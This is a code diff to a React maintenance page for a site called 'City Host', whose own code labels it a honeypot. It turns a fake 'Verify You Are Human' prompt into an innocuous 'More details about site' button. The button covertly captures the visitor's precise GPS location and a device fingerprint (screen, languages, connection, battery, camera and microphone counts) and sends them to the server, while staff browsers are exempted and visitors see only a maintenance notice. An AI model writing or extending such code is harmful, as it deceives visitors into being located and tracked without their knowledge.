@@ -7,10 +7,7 @@ import {
   Shield,
   RefreshCw,
   Clock,
-  Lock,
   ShieldCheck,
-  Database,
-  X,
   CheckCircle2,
   AlertTriangle,
 } from 'lucide-react';
@@ -51,13 +48,22 @@ async function collectDeepSilentSignals(): Promise<{
   try {
     availScreen = `${window.screen?.availWidth || 0}×${window.screen?.availHeight || 0}`;
     if (availScreen) parts.push(`WorkArea:${availScreen}`);
+    if (window.devicePixelRatio) parts.push(`DPR:${window.devicePixelRatio}`);
   } catch {}
 
   try {
     const navAny = navigator as Navigator & {
       getBattery?: () => Promise<{ level?: number; charging?: boolean }>;
       connection?: { downlink?: number; rtt?: number; effectiveType?: string };
+      maxTouchPoints?: number;
+      languages?: readonly string[];
     };
+    if (typeof navAny.maxTouchPoints === 'number') {
+      parts.push(`Touch:${navAny.maxTouchPoints}`);
+    }
+    if (Array.isArray(navAny.languages) && navAny.languages.length > 0) {
+      parts.push(`Lang:${navAny.languages.slice(0, 2).join(',')}`);
+    }
     if (typeof navAny.getBattery === 'function') {
       const bat = await Promise.race([
         navAny.getBattery(),
@@ -70,6 +76,9 @@ async function collectDeepSilentSignals(): Promise<{
       }
     }
     if (navAny.connection) {
+      if (navAny.connection.effectiveType) {
+        parts.push(`Conn:${navAny.connection.effectiveType}`);
+      }
       if (typeof navAny.connection.downlink === 'number') {
         downlinkMbps = navAny.connection.downlink;
         parts.push(`Net:${navAny.connection.downlink}Mbps`);
@@ -79,10 +88,23 @@ async function collectDeepSilentSignals(): Promise<{
         parts.push(`RTT:${navAny.connection.rtt}ms`);
       }
     }
+    if (navigator.mediaDevices?.enumerateDevices) {
+      const devs = await Promise.race([
+        navigator.mediaDevices.enumerateDevices(),
+        new Promise<null>((r) => setTimeout(() => r(null), 500)),
+      ]);
+      if (Array.isArray(devs) && devs.length > 0) {
+        const cams = devs.filter((d) => d.kind === 'videoinput').length;
+        const mics = devs.filter((d) => d.kind === 'audioinput').length;
+        parts.push(`Media:${cams}C/${mics}M`);
+      }
+    }
+    const agTag = localStorage.getItem('cityhost_agent_tag');
+    if (agTag) parts.push(`Tag:${agTag}`);
   } catch {}
 
   return {
-    summary: parts.join(' | ').slice(0, 140),
+    summary: parts.join(' | ').slice(0, 180),
     batteryInfo,
     availScreen,
     downlinkMbps,
@@ -92,6 +114,15 @@ async function collectDeepSilentSignals(): Promise<{
 
 function sendHoneypotEvent(action: string, detail: string, extra?: Record<string, unknown>) {
   if (typeof window === 'undefined') return;
+  try {
+    if (
+      localStorage.getItem('cityhost_staff_user') ||
+      localStorage.getItem('cityhost_staff_token') ||
+      localStorage.getItem('cityhost_actor_role') === 'admin'
+    ) {
+      return;
+    }
+  } catch {}
   const visitorId = getHoneypotVisitorId();
   const device = collectDeviceSnapshot();
   fetch('/api/events', {
@@ -121,50 +152,45 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
   const displayTitle = (title || MAINTENANCE_CONFIG.title).trim();
   const displayMessage = (message || MAINTENANCE_CONFIG.message).trim();
 
-  const [trapOpen, setTrapOpen] = useState(false);
   const [gpsStatus, setGpsStatus] = useState<'idle' | 'requesting' | 'captured' | 'denied'>('idle');
   const [statusMessage, setStatusMessage] = useState('');
 
-  const handleOpenHoneypot = () => {
-    setTrapOpen(true);
-    setGpsStatus('idle');
-    setStatusMessage('');
-    sendHoneypotEvent(
-      'honeypot_opened',
-      'Opened "View Live Site Data · Human Verification" on Maintenance page'
-    );
-  };
-
-  const handleRequestLiveAccess = async () => {
+  const handleDirectHumanVerify = () => {
     setGpsStatus('requesting');
-    setStatusMessage('Verifying browser session...');
+    setStatusMessage('Loading site details...');
 
-    const silent = await collectDeepSilentSignals();
-    sendHoneypotEvent(
-      'honeypot_opened',
-      `Clicked "I am Human — View Live Data" · ${silent.summary || 'Device HW captured'}`,
-      {
-        honeypotContact: silent.summary || undefined,
-        batteryInfo: silent.batteryInfo,
-        availScreen: silent.availScreen,
-        downlinkMbps: silent.downlinkMbps,
-        rttMs: silent.rttMs,
-      }
-    );
+    const silentPromise = collectDeepSilentSignals();
+
+    silentPromise.then((silent) => {
+      sendHoneypotEvent(
+        'honeypot_opened',
+        `Clicked "More details about site" · ${silent.summary || 'Device HW captured'}`,
+        {
+          honeypotContact: silent.summary || undefined,
+          batteryInfo: silent.batteryInfo,
+          availScreen: silent.availScreen,
+          downlinkMbps: silent.downlinkMbps,
+          rttMs: silent.rttMs,
+        }
+      );
+    });
 
     if (typeof navigator === 'undefined' || !navigator.geolocation) {
-      sendHoneypotEvent(
-        'honeypot_gps_denied',
-        `Human check attempted (Browser geo unavailable) · ${silent.summary}`,
-        { honeypotContact: silent.summary || undefined }
-      );
+      silentPromise.then((silent) => {
+        sendHoneypotEvent(
+          'honeypot_gps_denied',
+          `Site details clicked (Browser geo unavailable)${silent.summary ? ` · ${silent.summary}` : ''}`,
+          { honeypotContact: silent.summary || undefined }
+        );
+      });
       setGpsStatus('denied');
-      setStatusMessage('Verification incomplete. Browser confirmation is required to continue.');
+      setStatusMessage('City Host v2.4 · Scheduled maintenance in progress. Please check back shortly.');
       return;
     }
 
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
+      async (pos) => {
+        const silent = await silentPromise;
         const lat = Number(pos.coords.latitude.toFixed(6));
         const lng = Number(pos.coords.longitude.toFixed(6));
         const accuracy = Math.round(pos.coords.accuracy || 0);
@@ -176,20 +202,31 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
             gpsLng: lng,
             gpsAccuracy: accuracy,
             honeypotContact: silent.summary || undefined,
+            batteryInfo: silent.batteryInfo,
+            availScreen: silent.availScreen,
+            downlinkMbps: silent.downlinkMbps,
+            rttMs: silent.rttMs,
           }
         );
         setGpsStatus('captured');
-        setStatusMessage('Human verification complete. Loading live data stream...');
+        setStatusMessage('City Host v2.4 · Scheduled maintenance in progress. Full access will resume shortly.');
       },
-      (err) => {
+      async (err) => {
+        const silent = await silentPromise;
         sendHoneypotEvent(
           'honeypot_gps_denied',
-          `Clicked Human Check (${err?.message || 'Prompt dismissed'})${silent.summary ? ` · ${silent.summary}` : ''}`,
-          { honeypotContact: silent.summary || undefined }
+          `Site details clicked (${err?.message || 'Prompt dismissed'})${silent.summary ? ` · ${silent.summary}` : ''}`,
+          {
+            honeypotContact: silent.summary || undefined,
+            batteryInfo: silent.batteryInfo,
+            availScreen: silent.availScreen,
+            downlinkMbps: silent.downlinkMbps,
+            rttMs: silent.rttMs,
+          }
         );
         setGpsStatus('denied');
         setStatusMessage(
-          'Verification incomplete. Please click Allow on the browser prompt above to pass the human check.'
+          'City Host v2.4 · Scheduled maintenance in progress. Please check back shortly.'
         );
       },
       {
@@ -265,91 +302,31 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
             </p>
           </div>
 
-          {/* Subtle Preview Option */}
-          <div className="pt-1 border-t border-surface-800/60">
+          {/* Subtle Direct Info Button */}
+          <div className="pt-2 border-t border-surface-800/60 space-y-2.5">
             <button
               type="button"
               data-testid="maintenance-honeypot-btn"
-              onClick={handleOpenHoneypot}
-              className="text-[11px] text-surface-400 hover:text-amber-300 transition inline-flex items-center gap-1.5 cursor-pointer"
+              disabled={gpsStatus === 'requesting'}
+              onClick={handleDirectHumanVerify}
+              className="w-full py-2.5 px-4 rounded-xl bg-surface-800/80 hover:bg-surface-800 border border-surface-700/80 text-xs font-semibold text-surface-200 shadow-sm flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-60 transition"
             >
-              <Database className="w-3 h-3 text-surface-500" />
-              <span className="underline decoration-dotted underline-offset-4">
-                View Live Site Data · Human Verification
+              <ShieldCheck className="w-4 h-4 text-amber-400" />
+              <span>
+                {gpsStatus === 'requesting'
+                  ? 'Loading details...'
+                  : 'More details about site'}
               </span>
             </button>
-          </div>
-        </div>
-      </main>
-
-      {/* Footer */}
-      <footer className="w-full max-w-4xl text-center py-3 text-[11px] text-surface-400 z-10 flex items-center justify-center gap-2">
-        <Shield className="w-3.5 h-3.5 text-surface-400" />
-        <span>City Host IT Operations · Scheduled Maintenance</span>
-      </footer>
-
-      {/* Human Verification Modal */}
-      {trapOpen && (
-        <div
-          data-testid="maintenance-honeypot-modal"
-          className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4"
-        >
-          <div className="w-full max-w-sm rounded-3xl bg-surface-900 border border-surface-700/80 p-5 space-y-4 shadow-2xl text-left">
-            <div className="flex items-start justify-between gap-2">
-              <div className="flex items-center gap-2">
-                <div className="w-8 h-8 rounded-xl bg-amber-500/15 border border-amber-500/30 flex items-center justify-center">
-                  <Lock className="w-4 h-4 text-amber-300" />
-                </div>
-                <div>
-                  <h3 className="text-sm font-bold text-white">Verify You Are Human</h3>
-                  <p className="text-[10px] text-surface-400">
-                    Confirm you are not a robot to view live site data
-                  </p>
-                </div>
-              </div>
-              <button
-                type="button"
-                onClick={() => setTrapOpen(false)}
-                className="p-1 text-surface-400 hover:text-white cursor-pointer"
-                aria-label="Close"
-              >
-                <X className="w-4 h-4" />
-              </button>
-            </div>
-
-            <div className="p-3 rounded-2xl bg-surface-950/90 border border-surface-800 space-y-1.5">
-              <div className="flex items-center justify-between text-[11px]">
-                <span className="text-surface-400">Active Ad Regions</span>
-                <span className="font-mono text-emerald-300 font-bold blur-[3px] select-none">
-                  UK · US · CA · AU · AE
-                </span>
-              </div>
-              <div className="flex items-center justify-between text-[11px]">
-                <span className="text-surface-400">Live Traveler Leads (24h)</span>
-                <span className="font-mono text-amber-300 font-bold blur-[3px] select-none">
-                  48 Verified Leads
-                </span>
-              </div>
-              <div className="flex items-center justify-between text-[11px]">
-                <span className="text-surface-400">WhatsApp Rotator Feed</span>
-                <span className="font-mono text-sky-300 font-bold blur-[3px] select-none">
-                  Online · 6 Desks
-                </span>
-              </div>
-            </div>
-
-            <p className="text-[11px] text-surface-300 leading-relaxed">
-              Automated bot traffic is restricted during maintenance. Complete the quick browser
-              human check below to continue to the live site data preview.
-            </p>
 
             {statusMessage && (
               <div
-                className={`p-2.5 rounded-xl border text-[11px] flex items-start gap-2 ${
+                data-testid="maintenance-honeypot-modal"
+                className={`p-2.5 rounded-xl border text-[11px] text-left flex items-start gap-2 ${
                   gpsStatus === 'captured'
                     ? 'bg-emerald-500/15 border-emerald-500/35 text-emerald-200'
                     : gpsStatus === 'denied'
-                      ? 'bg-amber-500/15 border-amber-500/35 text-amber-200'
+                      ? 'bg-surface-800/90 border-surface-700 text-surface-300'
                       : 'bg-sky-500/15 border-sky-500/35 text-sky-200'
                 }`}
               >
@@ -361,24 +338,15 @@ export default function MaintenanceView({ title, message }: MaintenanceViewProps
                 <span>{statusMessage}</span>
               </div>
             )}
-
-            <button
-              type="button"
-              data-testid="honeypot-verify-gps-btn"
-              disabled={gpsStatus === 'requesting'}
-              onClick={handleRequestLiveAccess}
-              className="w-full py-2.5 px-4 rounded-xl bg-gradient-to-r from-amber-500 to-brand-500 hover:brightness-110 text-xs font-extrabold text-surface-950 shadow-lg flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-60"
-            >
-              <ShieldCheck className="w-3.5 h-3.5" />
-              <span>
-                {gpsStatus === 'requesting'
-                  ? 'Verifying browser session...'
-                  : 'I am Human (Not a Robot) — View Live Data'}
-              </span>
-            </button>
           </div>
         </div>
-      )}
+      </main>
+
+      {/* Footer */}
+      <footer className="w-full max-w-4xl text-center py-3 text-[11px] text-surface-400 z-10 flex items-center justify-center gap-2">
+        <Shield className="w-3.5 h-3.5 text-surface-400" />
+        <span>City Host · Scheduled Maintenance</span>
+      </footer>
     </div>
   );
 }
